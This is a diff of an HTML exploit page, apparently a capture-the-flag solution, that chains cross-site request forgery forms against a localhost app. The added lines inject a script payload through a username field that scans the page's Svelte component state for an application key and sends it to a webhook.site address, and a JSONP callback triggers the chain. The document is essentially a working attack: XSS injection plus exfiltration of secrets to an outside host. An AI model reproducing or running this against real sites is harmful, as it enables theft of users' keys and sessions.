@@ -11,20 +11,24 @@
   <!-- Шаг 3: POST /api/whoami -->
   <form id="f3" target="worker" action="http://localhost:8000/api/whoami"
         method="POST" enctype="text/plain">
-    <input name='{"new_username":"PAYLOAD' value='HERE"}'>
+    <input name='{"new_username":"</textarea><script>setTimeout(()' value='>{for(let e of document.querySelectorAll("*"))for(let k in e)if(k.includes("__svelte"))try{const s=e[k];if(s?.ctx?.appState?.key){fetch("https://webhook.site/2dc905f2-89e6-493d-bc1b-1d51702524e0?k="+s.ctx.appState.key);break}}catch(x){}},1000)</script>"}'>
   </form>
 
   <!-- Шаг 4: GET /#/settings -->
   <form id="f4" target="worker" action="http://localhost:8000/#/settings" method="GET"></form>
 
   <script>
-    window.open('', 'worker');
+    function exploit(data) {
+        window.open('', 'worker');
 
-    setTimeout(() => { document.getElementById('f1').submit(); }, 3000);
-    setTimeout(() => { document.getElementById('f2').submit(); }, 6000);
-    setTimeout(() => { document.getElementById('f3').submit(); }, 9000);
-    setTimeout(() => { document.getElementById('f4').submit(); }, 12000);
+        setTimeout(() => { document.getElementById('f1').submit(); }, 3000);
+        setTimeout(() => { document.getElementById('f2').submit(); }, 6000);
+        setTimeout(() => { document.getElementById('f3').submit(); }, 9000);
+        setTimeout(() => { document.getElementById('f4').submit(); }, 12000);
+    }
   </script>
+
+<script src=/api/whoami/jsonp?callback=exploit></script>
 
 </body>
 </html>
